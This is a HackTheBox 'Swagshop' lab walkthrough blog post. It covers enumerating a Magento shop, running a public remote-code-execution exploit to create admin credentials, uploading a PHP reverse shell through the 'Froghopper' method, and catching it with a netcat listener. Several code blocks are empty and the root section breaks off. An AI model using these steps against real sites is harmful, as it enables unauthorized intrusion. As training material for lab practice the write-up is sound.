---
layout: post
title: Hackthebox Swagshop Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-28/swagshop-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Swagshop".<br>

### Complation: 49th / 131 boxes

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.140 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-27 19:44 EEST
Nmap scan report for 10.10.10.140
Host is up (0.039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.07 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.140
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/09/27 19:49:36 Starting gobuster
===============================================================
/index.php (Status: 200)
/media (Status: 301)
/includes (Status: 301)
/install.php (Status: 200)
/lib (Status: 301)
/app (Status: 301)
/js (Status: 301)
/api.php (Status: 200)
/shell (Status: 301)
/skin (Status: 301)
/cron.php (Status: 200)
/var (Status: 301)
/errors (Status: 301)
/mage (Status: 200)
/server-status (Status: 403)
===============================================================
2019/09/27 20:19:17 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

On the page port 80, we can find a shopping page and its framework is "<a href="https://magento.com/">Magento</a>"
![placeholder](https://inar1.github.io/public/images/2019-09-28/2019-09-27-20-07-06.png)

Since we figured out that CMS Magento is being used on this website, try to google with following term.
{% highlight shell %}
Magento scan
{% endhighlight %}

Then, we can find this tool named "<a href="https://github.com/steverobbins/magescan">Mage Scan</a>".<br>
As it's written, download "magescan.phar" from the <a href="https://github.com/steverobbins/magescan/releases">release page</a> and run with following way.
{% highlight shell %}
root@kali:~# php magescan.phar scan:all 10.10.10.140
Scanning http://10.10.10.140/...

                       
  Magento Information  
                       

+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+

                     
  Installed Modules  
                     

No detectable modules were found

                       
  Catalog Information  
                       

+------------+---------+
| Type       | Count   |
+------------+---------+
| Categories | Unknown |
| Products   | Unknown |
+------------+---------+

           
  Patches  
           

+------------+---------+
| Name       | Status  |
+------------+---------+
| SUPEE-5344 | Unknown |
| SUPEE-5994 | Unknown |
| SUPEE-6285 | Unknown |
| SUPEE-6482 | Unknown |
| SUPEE-6788 | Unknown |
| SUPEE-7405 | Unknown |
| SUPEE-8788 | Unknown |
+------------+---------+

           
  Sitemap  
           

Sitemap is not declared in robots.txt
Sitemap is not accessible: http://10.10.10.140/sitemap.xml

                     
  Server Technology  
                     

+--------+------------------------+
| Key    | Value                  |
+--------+------------------------+
| Server | Apache/2.4.18 (Ubuntu) |
+--------+------------------------+

                          
  Unreachable Path Check  
                          

+----------------------------------------------+---------------+--------+
| Path                                         | Response Code | Status |
+----------------------------------------------+---------------+--------+
| .bzr/                                        | 404           | Pass   |
| .cvs/                                        | 404           | Pass   |
| .git/                                        | 404           | Pass   |
| .git/config                                  | 404           | Pass   |
| .git/refs/                                   | 404           | Pass   |
| .gitignore                                   | 404           | Pass   |
| .hg/                                         | 404           | Pass   |
| .idea                                        | 404           | Pass   |
| .svn/                                        | 404           | Pass   |
| .svn/entries                                 | 404           | Pass   |
| admin/                                       | 404           | Pass   |
| admin123/                                    | 404           | Pass   |
| adminer.php                                  | 404           | Pass   |
| administrator/                               | 404           | Pass   |
| adminpanel/                                  | 404           | Pass   |
| aittmp/index.php                             | 404           | Pass   |
| app/etc/enterprise.xml                       | 404           | Pass   |
| app/etc/local.xml                            | 200           | Fail   |
| backend/                                     | 404           | Pass   |
| backoffice/                                  | 404           | Pass   |
| beheer/                                      | 404           | Pass   |
| capistrano/config/deploy.rb                  | 404           | Pass   |
| chive                                        | 404           | Pass   |
| composer.json                                | 404           | Pass   |
| composer.lock                                | 404           | Pass   |
| vendor/composer/installed.json               | 404           | Pass   |
| config/deploy.rb                             | 404           | Pass   |
| control/                                     | 404           | Pass   |
| dev/tests/functional/etc/config.xml          | 404           | Pass   |
| downloader/index.php                         | 404           | Pass   |
| index.php/rss/order/NEW/new                  | 200           | Fail   |
| info.php                                     | 404           | Pass   |
| mageaudit.php                                | 404           | Pass   |
| magmi/                                       | 404           | Pass   |
| magmi/conf/magmi.ini                         | 404           | Pass   |
| magmi/web/magmi.php                          | 404           | Pass   |
| Makefile                                     | 404           | Pass   |
| manage/                                      | 404           | Pass   |
| management/                                  | 404           | Pass   |
| manager/                                     | 404           | Pass   |
| modman                                       | 404           | Pass   |
| p.php                                        | 404           | Pass   |
| panel/                                       | 404           | Pass   |
| phpinfo.php                                  | 404           | Pass   |
| phpmyadmin                                   | 404           | Pass   |
| README.md                                    | 404           | Pass   |
| README.txt                                   | 404           | Pass   |
| shell/                                       | 200           | Fail   |
| shopadmin/                                   | 404           | Pass   |
| site_admin/                                  | 404           | Pass   |
| var/export/                                  | 200           | Fail   |
| var/export/export_all_products.csv           | 404           | Pass   |
| var/export/export_customers.csv              | 404           | Pass   |
| var/export/export_product_stocks.csv         | 404           | Pass   |
| var/log/                                     | 404           | Pass   |
| var/log/exception.log                        | 404           | Pass   |
| var/log/payment_authnetcim.log               | 404           | Pass   |
| var/log/payment_authorizenet.log             | 404           | Pass   |
| var/log/payment_authorizenet_directpost.log  | 404           | Pass   |
| var/log/payment_cybersource_soap.log         | 404           | Pass   |
| var/log/payment_ogone.log                    | 404           | Pass   |
| var/log/payment_payflow_advanced.log         | 404           | Pass   |
| var/log/payment_payflow_link.log             | 404           | Pass   |
| var/log/payment_paypal_billing_agreement.log | 404           | Pass   |
| var/log/payment_paypal_direct.log            | 404           | Pass   |
| var/log/payment_paypal_express.log           | 404           | Pass   |
| var/log/payment_paypal_standard.log          | 404           | Pass   |
| var/log/payment_paypaluk_express.log         | 404           | Pass   |
| var/log/payment_pbridge.log                  | 404           | Pass   |
| var/log/payment_verisign.log                 | 404           | Pass   |
| var/log/system.log                           | 404           | Pass   |
| var/report/                                  | 404           | Pass   |
+----------------------------------------------+---------------+--------+
{% endhighlight %}

We found the version of Mangento is "1.9.0.0" or "1.9.0.1".<br>
Then, run searchsploit to find a well-known vulnerability.
{% highlight shell %}
root@kali:~# searchsploit magento
---------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                            |  Path
                                                                                                          | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------- ----------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting        | exploits/php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting  | exploits/php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                 | exploits/php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                            | exploits/php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                              | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                    | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                               | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                                                 | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                 | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                              | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                   | exploits/php/webapps/38651.txt
---------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

Then, we can think like following way.
1. We can ignore the older version 1.2 and newer version 1.9.2.1.
2. If the major version is different, the codes could be changed a lot.
3. We don't have any credential for Magento.
4. Since Mage Scan didn't find any plugin, we can ignore these 2 for the "MAGMI Plugin".
5. The year of "vendor contact timeline" of "Magento eCommerce - Local File Disclosure" is "2012" while The copywrite of webpage on Swagshop is "2014".

This means, we should prioritize the exploit <a href="https://www.exploit-db.com/exploits/37977">"Magento eCommerce - Remote Code Execution"</a>. Besides, the date of this exploit is "2015".<br>
Remove syntax error, modify one line and try to execute.
{% highlight shell %}
// from
target = "http://target.com/"

// to
target = "http://10.10.10.140/index.php/"
{% endhighlight %}
{% highlight shell %}
root@kali:~# python 37977.py 
WORKED
Check http://target.com/admin with creds forme:forme
{% endhighlight %}

Now, we had following credential for the admin console of Magento.
{% highlight shell %}
forme:forme
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-09-28/2019-09-28-20-31-58.png)

Then, somehow we have to get a reverse shell. Sounds there are many ways to upload a shell.<br>
This time, we use the method "<a href="https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper">Froghopper</a> attack".<br><br>

Then, go to Catalog > Manage Categories > New Root Category.<br>
There we can upload a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell code</a>.
![placeholder](https://inar1.github.io/public/images/2019-09-28/2019-09-27-20-07-06.png)

Our uploaded file should be uploaded in '/media/catalog/category'.<br>
To access this file, we have to activete a Magento developer function "Allow Symlinks" for Magneto Newslatter templates.<br>
Go to System > Configuration > Developer and change the value of "Allow Symlinks".
![placeholder](https://inar1.github.io/public/images/2019-09-28/2019-09-27-20-07-06.png)

Then, go to Newsletter > Newsletter Template.<br>
Put following code.
{% highlight shell %}

{% endhighlight %}

After that, launch netcat and click Preview.<br>
The php reverse shell script would be executed.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...

{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-09-28/2019-09-27-20-07-06.png)
{% highlight shell %}

{% endhighlight %}


### 3. Getting Root


